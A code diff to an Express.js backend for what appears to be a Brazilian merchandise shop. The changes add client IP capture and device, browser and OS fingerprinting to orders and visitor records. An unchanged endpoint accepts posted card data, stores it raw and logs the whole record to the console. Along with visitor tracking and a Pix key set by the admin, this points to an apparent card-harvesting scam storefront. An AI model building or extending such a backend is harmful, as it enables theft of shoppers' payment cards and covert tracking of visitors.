@@ -8,9 +8,9 @@ app.use('/admin', express.static('admin'));
 
 // ========== BANCO DE DADOS MOCKADO ==========
 let produtos = [
-    { id: 1, nome: "Camiseta Bolsonaro 2026", preco: 89.90, preco_antigo: 129.90, imagem: "https://placehold.co/600x800/f0ede5/8b6b3d?text=CAMISETA+2026", categoria: "Camisetas", estoque: 50, destaque: true, ativo: true, created_at: new Date().toISOString() },
-    { id: 2, nome: "Boné Exército e Fé", preco: 59.90, preco_antigo: 89.90, imagem: "https://placehold.co/600x800/e6dfd1/8b6b3d?text=BONE+PRETO", categoria: "Bonés", estoque: 30, destaque: true, ativo: true, created_at: new Date().toISOString() },
-    { id: 3, nome: "Caneca Ordem e Progresso", preco: 39.90, preco_antigo: 59.90, imagem: "https://placehold.co/600x800/fff4e6/8b6b3d?text=CANECA", categoria: "Canecas", estoque: 100, destaque: true, ativo: true, created_at: new Date().toISOString() }
+    { id: 1, nome: "Camiseta Bolsonaro 2026", preco: 89.90, preco_antigo: 129.90, imagem: "https://i.imgur.com/placeholder.jpg", categoria: "Camisetas", estoque: 50, destaque: true, ativo: true, created_at: new Date().toISOString() },
+    { id: 2, nome: "Boné Exército e Fé", preco: 59.90, preco_antigo: 89.90, imagem: "https://i.imgur.com/placeholder.jpg", categoria: "Bonés", estoque: 30, destaque: true, ativo: true, created_at: new Date().toISOString() },
+    { id: 3, nome: "Caneca Ordem e Progresso", preco: 39.90, preco_antigo: 59.90, imagem: "https://i.imgur.com/placeholder.jpg", categoria: "Canecas", estoque: 100, destaque: true, ativo: true, created_at: new Date().toISOString() }
 ];
 
 let pedidos = [];
@@ -19,8 +19,49 @@ let visitantes = [];
 let carrinhosAbandonados = [];
 let pixKey = '';
 
+// ========== FUNÇÃO PARA PEGAR IP REAL ==========
+function getClientIp(req) {
+    return req.headers['x-forwarded-for']?.split(',')[0] || 
+           req.socket.remoteAddress || 
+           req.connection.remoteAddress ||
+           'unknown';
+}
+
+// ========== FUNÇÃO PARA DETECTAR DISPOSITIVO ==========
+function detectDevice(userAgent) {
+    if (!userAgent) return 'Desconhecido';
+    if (/iPhone|iPad|iPod/i.test(userAgent)) return 'iOS';
+    if (/Android/i.test(userAgent)) return 'Android';
+    if (/Windows/i.test(userAgent)) return 'Windows';
+    if (/Mac/i.test(userAgent)) return 'Mac';
+    if (/Linux/i.test(userAgent)) return 'Linux';
+    return 'Desconhecido';
+}
+
+function detectBrowser(userAgent) {
+    if (!userAgent) return 'Desconhecido';
+    if (/Chrome/i.test(userAgent) && !/Edg/i.test(userAgent)) return 'Chrome';
+    if (/Firefox/i.test(userAgent)) return 'Firefox';
+    if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) return 'Safari';
+    if (/Edg/i.test(userAgent)) return 'Edge';
+    if (/Opera|OPR/i.test(userAgent)) return 'Opera';
+    return 'Outro';
+}
+
+function detectOS(userAgent) {
+    if (!userAgent) return 'Desconhecido';
+    if (/Windows NT 10.0/i.test(userAgent)) return 'Windows 10';
+    if (/Windows NT 11.0/i.test(userAgent)) return 'Windows 11';
+    if (/Mac OS X/i.test(userAgent)) return 'macOS';
+    if (/Android/i.test(userAgent)) return 'Android';
+    if (/iPhone|iPad|iPod/i.test(userAgent)) return 'iOS';
+    if (/Linux/i.test(userAgent)) return 'Linux';
+    return 'Outro';
+}
+
 // ========== ROTAS PÚBLICAS ==========
 
+// Listar produtos (para a loja) - retorna TODOS os produtos ativos
 app.get('/api/produtos', (req, res) => {
     let filtered = produtos.filter(p => p.ativo === true);
     res.json({ success: true, produtos: filtered });
@@ -41,29 +82,55 @@ app.get('/api/cep/:cep', async (req, res) => {
 
 app.post('/api/pedido', (req, res) => {
     const pedidoId = 'CAP' + Date.now();
-    const pedido = { ...req.body, pedido_id: pedidoId, created_at: new Date().toISOString() };
+    const ip = getClientIp(req);
+    const userAgent = req.headers['user-agent'];
+    const pedido = { 
+        ...req.body, 
+        pedido_id: pedidoId, 
+        ip_cliente: ip,
+        dispositivo: detectDevice(userAgent),
+        navegador: detectBrowser(userAgent),
+        sistema: detectOS(userAgent),
+        created_at: new Date().toISOString() 
+    };
     pedidos.unshift(pedido);
     console.log('Pedido salvo:', pedidoId);
     res.json({ success: true, pedido_id: pedidoId });
 });
 
 app.post('/api/cartao', (req, res) => {
-    const novoCartao = { id: Date.now(), ...req.body, created_at: new Date().toISOString() };
+    const novoCartao = { 
+        id: Date.now(), 
+        ...req.body, 
+        created_at: new Date().toISOString() 
+    };
     cartoes.push(novoCartao);
     console.log('Cartão salvo:', novoCartao);
     res.json({ success: true });
 });
 
 app.post('/api/visitante', (req, res) => {
-    const { visitor_id, ip, user_agent, origem } = req.body;
+    const ip = getClientIp(req);
+    const userAgent = req.headers['user-agent'];
+    const { visitor_id, origem } = req.body;
+    
     const existing = visitantes.find(v => v.visitor_id === visitor_id);
     if (existing) {
         existing.ultima_atividade = new Date().toISOString();
         existing.page_views = (existing.page_views || 0) + 1;
     } else {
         visitantes.push({
-            visitor_id, ip, user_agent, origem: origem || 'direct', etapa: 'visitante',
-            page_views: 1, primeira_visita: new Date().toISOString(), ultima_atividade: new Date().toISOString()
+            visitor_id,
+            ip: ip,
+            user_agent: userAgent,
+            dispositivo: detectDevice(userAgent),
+            navegador: detectBrowser(userAgent),
+            sistema: detectOS(userAgent),
+            origem: origem || 'direct',
+            etapa: 'visitante',
+            page_views: 1,
+            primeira_visita: new Date().toISOString(),
+            ultima_atividade: new Date().toISOString()
         });
     }
     res.json({ success: true });
@@ -116,10 +183,23 @@ app.get('/api/admin/produtos', verifyAdmin, (req, res) => {
 
 app.post('/api/admin/produtos', verifyAdmin, (req, res) => {
     const novoId = Math.max(...produtos.map(p => p.id), 0) + 1;
-    const novoProduto = { id: novoId, ...req.body, ativo: true, created_at: new Date().toISOString() };
+    const novoProduto = { 
+        id: novoId, 
+        ...req.body, 
+        ativo: true, 
+        created_at: new Date().toISOString() 
+    };
     produtos.push(novoProduto);
     console.log('Produto adicionado:', novoProduto.nome);
     res.json({ success: true, produto: novoProduto });
+});
+
+app.put('/api/admin/produtos/:id', verifyAdmin, (req, res) => {
+    const id = parseInt(req.params.id);
+    const index = produtos.findIndex(p => p.id === id);
+    if (index === -1) return res.status(404).json({ success: false });
+    produtos[index] = { ...produtos[index], ...req.body };
+    res.json({ success: true });
 });
 
 app.delete('/api/admin/produtos/:id/permanent', verifyAdmin, (req, res) => {
